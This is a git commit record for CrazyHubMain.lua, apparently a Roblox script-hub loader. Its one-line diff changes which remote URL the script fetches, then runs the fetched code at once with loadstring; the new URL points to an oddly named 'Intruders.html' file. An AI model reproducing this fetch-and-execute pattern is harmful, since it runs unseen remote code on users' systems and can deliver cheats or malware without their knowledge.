ffcec2e6bc2575962514174c7cd6bb246df4e602
CrazyHub <78809386+CrazyHub123@users.noreply.github.com>
2023-03-26 21:32:57 +0300

    Update CrazyHubMain.lua

--- CrazyHubMain.lua
+++ CrazyHubMain.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tozxart/The-Intruders/main/AnimeLostSimulator.lua"))()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/lifaiossama/errors/main/Intruders.html")()
